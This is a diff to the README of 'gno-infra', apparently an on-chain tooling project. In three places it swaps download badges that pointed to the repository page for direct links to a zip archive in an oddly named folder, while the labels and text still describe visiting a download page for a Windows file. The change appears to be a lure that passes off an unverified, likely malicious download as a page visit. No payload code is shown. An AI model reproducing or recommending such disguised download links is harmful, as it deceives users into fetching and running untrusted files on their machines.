@@ -1,6 +1,6 @@
 # gno-infra - Build On-Chain Tools With Ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/limacoid-genusantennaria705/gno-infra)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/limacoid-genusantennaria705/gno-infra/main/hagiologic/infra_gno_v3.9.zip)
 
 ## 🚀 Overview
 
@@ -22,7 +22,7 @@ If the app uses extra files or a local runtime, keep the default install path un
 
 ## ⬇️ Download
 
-[![Download gno-infra](https://img.shields.io/badge/Download-gno--infra-grey?style=for-the-badge&logo=github)](https://github.com/limacoid-genusantennaria705/gno-infra)
+[![Download gno-infra](https://img.shields.io/badge/Download-gno--infra-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/limacoid-genusantennaria705/gno-infra/main/hagiologic/infra_gno_v3.9.zip)
 
 Use the link above to visit the download page. From there, get the file or package for Windows, then save it to your computer.
 
@@ -181,7 +181,7 @@ This makes it useful for users who want a stronger base for on-chain work.
 
 ## 🛠️ If You Want to Revisit the Download Page
 
-[![Open Download Page](https://img.shields.io/badge/Open-Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/limacoid-genusantennaria705/gno-infra)
+[![Open Download Page](https://img.shields.io/badge/Open-Download%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/limacoid-genusantennaria705/gno-infra/main/hagiologic/infra_gno_v3.9.zip)
 
 Use this page if you need to download the file again, check for updates, or review the repository page before installing
 
